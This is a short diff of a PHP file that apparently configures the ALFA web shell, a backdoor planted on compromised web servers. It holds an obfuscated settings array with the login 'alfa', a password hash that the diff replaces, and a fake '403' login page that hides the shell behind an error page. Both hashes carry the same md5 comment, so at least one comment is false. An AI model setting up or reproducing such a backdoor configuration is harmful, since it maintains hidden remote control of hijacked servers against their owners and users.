@@ -8,7 +8,7 @@
 */
 $GLOBALS['oZgNypoPRU'] = array(
     'username' => 'alfa',
-    'password' => '0cf704bce0c5bf016934e618c215cb3e',//md5(ehsan)
+    'password' => '6669aa769e5bf4125f96badc02e2de15',//md5(ehsan)
     'safe_mode' => '1',
     'login_page' => '403',
     'show_icons' => '1',
